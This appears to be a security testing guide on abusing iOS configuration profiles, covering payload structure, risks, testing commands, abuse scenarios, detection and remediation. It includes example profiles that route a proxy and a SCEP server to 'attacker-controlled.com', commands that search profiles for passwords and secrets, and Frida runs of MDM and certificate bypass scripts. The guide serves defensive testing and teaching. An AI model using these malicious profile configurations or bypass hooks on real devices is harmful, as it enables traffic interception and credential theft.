# Configuration Profile Abuse Guide

## Table of Contents

1. [Overview](#overview)
2. [Profile Structure](#profile-structure)
3. [Payload Types](#payload-types)
4. [Security Risks](#security-risks)
5. [Testing Methodology](#testing-methodology)
6. [Abuse Techniques](#abuse-techniques)
7. [Vulnerability Assessment](#vulnerability-assessment)
8. [Remediation](#remediation)
9. [OWASP MASTG References](#owasp-mastg-references)

---

## Overview

Configuration profiles are XML plists that configure iOS device settings. While essential for enterprise deployment, profiles can be abused to install malicious configurations, bypass restrictions, or gain unauthorized access. This guide covers configuration profile security, abuse techniques, and testing methodologies.

### Why Profile Security Matters

Configuration profiles control:
- **Network Settings**: Wi-Fi, VPN, proxy configurations
- **Security Policies**: Passcode, encryption, restrictions
- **App Management**: Installation, removal, configuration
- **Certificates**: SCEP enrollment, trust anchors
- **Device Management**: MDM enrollment, supervision

If profiles are compromised:
- Attackers can control device network traffic
- Malicious certificates can be installed
- Restrictions can be bypassed
- Sensitive data can be exfiltrated

---

## Profile Structure

### Basic Profile Format

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>PayloadContent</key>
    <array>
        <!-- Payloads go here -->
    </array>
    <key>PayloadDescription</key>
    <string>Configures device settings</string>
    <key>PayloadDisplayName</key>
    <string>Corporate Configuration</string>
    <key>PayloadIdentifier</key>
    <string>com.example.corporate.profile</string>
    <key>PayloadOrganization</key>
    <string>Example Inc.</string>
    <key>PayloadRemovalDisallowed</key>
    <true/>
    <key>PayloadType</key>
    <string>Configuration</string>
    <key>PayloadUUID</key>
    <string>UUID-1234-5678-90AB-CDEF</string>
    <key>PayloadVersion</key>
    <integer>1</integer>
</dict>
</plist>
```

### Profile Fields

| Field | Description | Security Considerations |
|-------|-------------|------------------------|
| **PayloadIdentifier** | Unique profile ID | Must be unique, predictable = abuse |
| **PayloadOrganization** | Organization name | Displayed to user |
| **PayloadDisplayName** | Profile name | Displayed to user |
| **PayloadDescription** | Profile description | Should be clear, not misleading |
| **PayloadRemovalDisallowed** | Prevent removal | Cannot remove if true (supervised) |
| **PayloadVersion** | Profile version | Increment for updates |

---

## Payload Types

### 1. Wi-Fi Payload (`com.apple.wifi.managed`)

```xml
<dict>
    <key>PayloadType</key>
    <string>com.apple.wifi.managed</string>
    <key>PayloadDisplayName</key>
    <string>Wi-Fi Configuration</string>
    <key>PayloadIdentifier</key>
    <string>com.example.wifi.profile</string>
    <key>PayloadUUID</key>
    <string>...</string>
    <key>PayloadVersion</key>
    <integer>1</integer>

    <!-- Wi-Fi Settings -->
    <key>SSID_STR</key>
    <string>Corporate Wi-Fi</string>

    <key>HiddenNetwork</key>
    <false/>

    <key>AutoJoin</key>
    <true/>

    <key>EncryptionType</key>
    <string>WPA2Enterprise</string>

    <key>Password</key>
    <string>CorporatePassword123!</string>

    <key>EAPClientConfiguration</key>
    <dict>
        <key>UserName</key>
        <string>$USERNAME</string>

        <key>UserPassword</key>
        <string>$PASSWORD</string>

        <key>AcceptEAPTypes</key>
        <array>
            <integer>13</integer> <!-- EAP-TLS -->
            <integer>21</integer> <!-- EAP-TTLS -->
        </array>

        <key>TLS</key>
        <dict>
            <key>PayloadCertificateUUID</key>
            <string>CERT-UUID</string>
        </dict>
    </dict>

    <key>ProxyType</key>
    <string>Manual</string>

    <key>ProxyServer</key>
    <string>proxy.company.com</string>

    <key>ProxyPort</key>
    <integer>8080</integer>
</dict>
```

**Security Risks**:
- Passwords in plaintext
- Proxy configuration intercepts all traffic
- Weak encryption (WEP, WPA1)
- Hidden networks with weak passwords

---

### 2. VPN Payload (`com.apple.vpn.managed`)

```xml
<dict>
    <key>PayloadType</key>
    <string>com.apple.vpn.managed</string>
    <key>PayloadDisplayName</key>
    <string>Corporate VPN</string>
    <key>PayloadIdentifier</key>
    <string>com.example.vpn.profile</string>
    <key>PayloadUUID</key>
    <string>...</string>
    <key>PayloadVersion</key>
    <integer>1</integer>

    <!-- VPN Settings -->
    <key>UserDefinedName</key>
    <string>Corporate VPN</string>

    <key>VPNType</key>
    <string>VPN</string>

    <key>VPNSubType</key>
    <string>com.apple.ppp.ipsec</string>

    <key>AuthenticationMethod</key>
    <string>SharedSecret</string>

    <key>SharedSecret</key>
    <string>CorporateSharedSecret123!</string>

    <key>XAuthEnabled</key>
    <integer>1</integer>

    <key>XAuthName</key>
    <string>vpnuser</string>

    <key>XAuthPassword</key>
    <string>vpnpassword123</string>

    <key>ServerAddress</key>
    <string>vpn.company.com</string>

    <key>OnDemandEnabled</key>
    <true/>

    <key>OnDemandRules</key>
    <array>
        <dict>
            <key>Action</key>
            <string>Connect</string>
            <key>URLStringProbe</key>
            <string>http://detectportal.firefox.com</string>
        </dict>
    </array>
</dict>
```

**Security Risks**:
- Shared secrets in plaintext
- Weak authentication (shared secret vs certificate)
- On-demand rules bypass network filtering
- No certificate validation

---

### 3. SCEP Payload (`com.apple.security.scep`)

```xml
<dict>
    <key>PayloadType</key>
    <string>com.apple.security.scep</string>
    <key>PayloadDisplayName</key>
    <string>Certificate Enrollment</string>
    <key>PayloadIdentifier</key>
    <string>com.example.scep.profile</string>
    <key>PayloadUUID</key>
    <string>...</string>
    <key>PayloadVersion</key>
    <integer>1</integer>

    <!-- SCEP Settings -->
    <key>URL</key>
    <string>https://scep.company.com/scep</string>

    <key>Name</key>
    <string>Corporate CA</string>

    <key>Subject</key>
    <array>
        <array>
            <string>CN</string>
            <string>$CN</string>
        </array>
        <array>
            <string>O</string>
            <string>Company Inc.</string>
        </array>
    </array>

    <key>KeySize</key>
    <integer>2048</integer>

    <key>KeyUsage</key>
    <integer>5</integer>

    <key>Keysize</key>
    <integer>2048</integer>

    <key>CAFingerprint</key>
    <data>BASE64_ENCODED_FINGERPRINT</data>

    <key>Retries</key>
    <integer>3</integer>

    <key>RetryDelay</key>
    <integer>10</integer>

    <key>Challenge</key>
    <string>SecretChallengeString</string>
</dict>
```

**Security Risks**:
- Weak challenge strings
- Insufficient key size (1024 bits)
- No CA fingerprint validation
- Weak certificate policies

---

### 4. Certificate Payload (`com.apple.security.certificate`)

```xml
<dict>
    <key>PayloadType</key>
    <string>com.apple.security.certificate</string>
    <key>PayloadDisplayName</key>
    <string>CA Certificate</string>
    <key>PayloadIdentifier</key>
    <string>com.example.cert.profile</string>
    <key>PayloadUUID</key>
    <string>...</string>
    <key>PayloadVersion</key>
    <integer>1</integer>

    <!-- Certificate Settings -->
    <key>CertificateFileName</key>
    <string>company-ca.pem</string>

    <key>PayloadCertificateFileName</key>
    <string>company-ca.pem</string>

    <key>Certificate</key>
    <data>BASE64_ENCODED_CERTIFICATE</data>
</dict>
```

**Security Risks**:
- Malicious CA certificates
- Self-signed certificates
- Weak certificate policies
- Certificate chain validation bypass

---

## Security Risks

### 1. Cleartext Passwords

**Vulnerability**: Passwords stored in plaintext in profile

**Example**:
```xml
<key>Password</key>
<string>CorporatePassword123!</string>

<key>SharedSecret</key>
<string>CorporateSharedSecret123!</string>
```

**Impact**:
- Password extraction from profile
- Credential compromise
- Network access breach

**Remediation**:
- Use SCEP for certificate-based auth
- Use MDM to push secrets securely
- Store passwords in Keychain, not profiles

---

### 2. Proxy Configuration Abuse

**Vulnerability**: Proxy configuration intercepts all traffic

**Example**:
```xml
<key>ProxyType</key>
<string>Manual</string>

<key>ProxyServer</key>
<string>attacker-controlled.com</string>

<key>ProxyPort</key>
<integer>8080</integer>
```

**Impact**:
- Complete traffic interception
- MITM attacks
- Credential theft
- Data exfiltration

**Remediation**:
- Avoid proxy in profiles
- Use per-app VPN instead
- Validate proxy certificates

---

### 3. Malicious CA Certificate

**Vulnerability**: Malicious CA certificate installs trusted root

**Example**:
```xml
<key>Certificate</key>
<data>BASE64_ENCODED_MALICIOUS_CA</data>
```

**Impact**:
- MITM attacks on any HTTPS connection
- Certificate validation bypass
- Complete network surveillance

**Remediation**:
- Validate CA fingerprints
- Use Apple-approved CAs
- Monitor installed certificates

---

### 4. SCEP Server Abuse

**Vulnerability**: Malicious SCEP server issues certificates

**Example**:
```xml
<key>URL</key>
<string>https://attacker-controlled.com/scep</string>

<key>Challenge</key>
<string>WeakChallenge</string>
```

**Impact**:
- Unauthorized certificate issuance
- Identity theft
- Man-in-the-middle attacks

**Remediation**:
- Validate SCEP server URL
- Use strong challenge strings
- Validate CA fingerprints

---

## Testing Methodology

### Phase 1: Profile Extraction

```bash
# 1. List all installed profiles
/usr/bin/profiles list

# 2. Export specific profile
/usr/bin/profiles export -o /tmp/profile.mobileconfig -identifier com.example.profile

# 3. Parse profile
plutil -p /tmp/profile.mobileconfig

# 4. Check for sensitive data
cat /tmp/profile.mobileconfig | grep -i "password\|secret\|token"
```

### Phase 2: Profile Analysis

```bash
# 1. Analyze profile structure
python3 -c "
import plistlib, sys

with open('/tmp/profile.mobileconfig', 'rb') as f:
    profile = plistlib.load(f)

print('Profile: ' + profile.get('PayloadDisplayName'))
print('Organization: ' + profile.get('PayloadOrganization'))
print('Type: ' + profile.get('PayloadType'))
print('Removable: ' + str(not profile.get('PayloadRemovalDisallowed', False)))

for payload in profile.get('PayloadContent', []):
    print('\nPayload Type: ' + payload.get('PayloadType'))
    print('Payload ID: ' + payload.get('PayloadIdentifier'))

    # Check for passwords
    if 'Password' in payload or 'SharedSecret' in payload:
        print('[!] WARNING: Password found in profile')

    # Check for proxy
    if 'ProxyType' in payload:
        print('[!] Proxy configured: ' + payload.get('ProxyServer'))

    # Check for VPN
    if 'VPNType' in payload:
        print('[!] VPN configured: ' + payload.get('ServerAddress'))

    # Check for certificates
    if 'Certificate' in payload:
        print('[!] Certificate found')
"

# 2. Extract certificates
cat /tmp/profile.mobileconfig | grep -A 5 "<key>Certificate</key>"
```

### Phase 3: Profile Manipulation Testing

```bash
# 1. Modify profile
# Edit profile manually or using script

# 2. Install modified profile
/usr/bin/profiles install -i /tmp/modified-profile.mobileconfig

# 3. Verify installation
/usr/bin/profiles list

# 4. Test removal (if removable)
/usr/bin/profiles remove -identifier com.example.profile
```

### Phase 4: Dynamic Analysis

```bash
# 1. Hook profile installation
frida -U -f com.example.app -l mdm-bypass.js

# 2. Monitor network traffic
# Use proxy (Burp Suite) to intercept traffic
# Verify profile settings take effect

# 3. Test certificate trust
# Install malicious CA and verify trusted
frida -U -f com.example.app -l enterprise-cert-bypass.js
```

---

## Abuse Techniques

### 1. Malicious Profile Installation

**Scenario**: User installs malicious profile from untrusted source

**Steps**:
1. Attacker creates malicious profile with proxy config
2. User downloads profile from malicious site
3. User installs profile (iOS prompts user to confirm)
4. All network traffic is routed through attacker's proxy

**Detection**:
```bash
# Check for proxy configuration
/usr/bin/profiles list | grep "ProxyType"

# Monitor network traffic
tcpdump -i any -n
```

**Remediation**:
- Block profile installation via MDM (supervised devices)
- Educate users about profile risks
- Monitor installed profiles

---

### 2. Certificate Trust Abuse

**Scenario**: Malicious CA certificate installed

**Steps**:
1. Attacker creates malicious profile with CA certificate
2. User installs profile
3. CA certificate is installed as trusted root
4. Attacker can intercept any HTTPS connection

**Detection**:
```bash
# List installed certificates
security find-certificate -a -p /System/Library/Keychains/SystemRootCertificates.keychain | grep -A 10 "BEGIN CERTIFICATE"

# Check for custom CAs
/usr/bin/profiles list | grep "Certificate"
```

**Remediation**:
- Validate CA fingerprints in profile
- Remove custom CAs from managed devices
- Use certificate pinning in apps

---

### 3. VPN Configuration Abuse

**Scenario**: Malicious VPN configuration routes traffic

**Steps**:
1. Attacker creates profile with malicious VPN server
2. User installs profile
3. All traffic is routed through attacker's VPN
4. Attacker can intercept and modify traffic

**Detection**:
```bash
# Check VPN configuration
/usr/bin/profiles list | grep "VPNType"

# Monitor network routes
netstat -rn
```

**Remediation**:
- Validate VPN server URLs
- Use certificate-based VPN auth
- Monitor VPN connections

---

### 4. Wi-Fi Credential Theft

**Scenario**: Wi-Fi credentials extracted from profile

**Steps**:
1. Attacker obtains profile file
2. Profile is unencrypted (plaintext XML)
3. Attacker extracts Wi-Fi password
4. Attacker connects to corporate Wi-Fi

**Detection**:
```bash
# Check for passwords in profile
cat /tmp/profile.mobileconfig | grep -i "password"

# Monitor Wi-Fi connections
airport -s
```

**Remediation**:
- Use SCEP for certificate-based Wi-Fi
- Store Wi-Fi passwords in Keychain
- Avoid plaintext passwords in profiles

---

## Vulnerability Assessment

### 1. Profile Manipulation Vulnerability

**Severity**: HIGH (7.5-8.5)
**CWE**: CWE-276 (Incorrect Default Permissions)
**OWASP**: M8 (Security Misconfiguration)

**Detection**:
```bash
# Check if profile is removable
/usr/bin/profiles list | grep "RemovalDisallowed"

# Test modification
# Modify profile and re-install
/usr/bin/profiles install -i /tmp/modified-profile.mobileconfig
```

**Impact**:
- User can remove MDM profile (unsupervised)
- Loss of device control
- Compliance violation

**Remediation**:
- Supervise devices
- Set `PayloadRemovalDisallowed: true`
- Monitor profile status

---

### 2. Cleartext Password Vulnerability

**Severity**: MEDIUM (5.0-6.5)
**CWE**: CWE-312 (Cleartext Storage of Sensitive Information)
**OWASP**: M9 (Insecure Data Storage)

**Detection**:
```bash
# Check for passwords in profile
cat /tmp/profile.mobileconfig | grep -i "password\|secret"
```

**Impact**:
- Password extraction from profile
- Credential compromise
- Network access breach

**Remediation**:
- Use SCEP for certificate-based auth
- Use MDM to push secrets securely
- Store passwords in Keychain

---

### 3. Proxy Configuration Abuse

**Severity**: CRITICAL (9.0+)
**CWE**: CWE-319 (Cleartext Transmission of Sensitive Information)
**OWASP**: M5 (Insecure Communication)

**Detection**:
```bash
# Check for proxy configuration
/usr/bin/profiles list | grep "ProxyType"

# Monitor network traffic
tcpdump -i any -n
```

**Impact**:
- Complete traffic interception
- MITM attacks
- Credential theft

**Remediation**:
- Avoid proxy in profiles
- Use per-app VPN instead
- Validate proxy certificates

---

### 4. Malicious CA Certificate

**Severity**: CRITICAL (9.0+)
**CWE**: CWE-295 (Improper Certificate Validation)
**OWASP**: M5 (Insecure Communication)

**Detection**:
```bash
# List installed certificates
security find-certificate -a -p /System/Library/Keychains/SystemRootCertificates.keychain
```

**Impact**:
- MITM attacks on any HTTPS connection
- Certificate validation bypass
- Complete network surveillance

**Remediation**:
- Validate CA fingerprints
- Use Apple-approved CAs
- Monitor installed certificates

---

## Remediation

### Profile Security Best Practices

1. **Profile Signing**:
   ```bash
   # Sign profiles with trusted certificate
   security cms -S -i profile.mobileconfig -o signed-profile.mobileconfig
   ```

2. **Avoid Cleartext Passwords**:
   ```xml
   <!-- Don't do this -->
   <key>Password</key>
   <string>CorporatePassword123!</string>

   <!-- Use SCEP instead -->
   <key>URL</key>
   <string>https://scep.company.com/scep</string>
   ```

3. **Validate Certificate Fingerprints**:
   ```xml
   <key>CAFingerprint</key>
   <data>VALID_FINGERPRINT</data>
   ```

4. **Supervise Devices**:
   ```bash
   # Enroll via DEP (automatic supervision)
   # Or supervise via Apple Configurator
   ```

5. **Monitor Profiles**:
   ```bash
   # Regularly audit installed profiles
   /usr/bin/profiles list
   ```

---

## OWASP MASTG References

| Test ID | Test Name | Profile Relevance |
|---------|-----------|-------------------|
| MASTG-TEST-0230 | Platform Interaction | Configuration profile abuse |
| MASTG-TEST-0226 | Network Communication | Certificate trust validation |
| MASTG-TEST-0225 | Network Communication | VPN configuration security |
| MASTG-TEST-0232 | Platform Interaction | MDM enrollment bypass |

---

**Document Version**: 1.0
**Last Updated**: 2025-04-04
**Author**: DragonJAR SAS
**License**: Apache 2.0
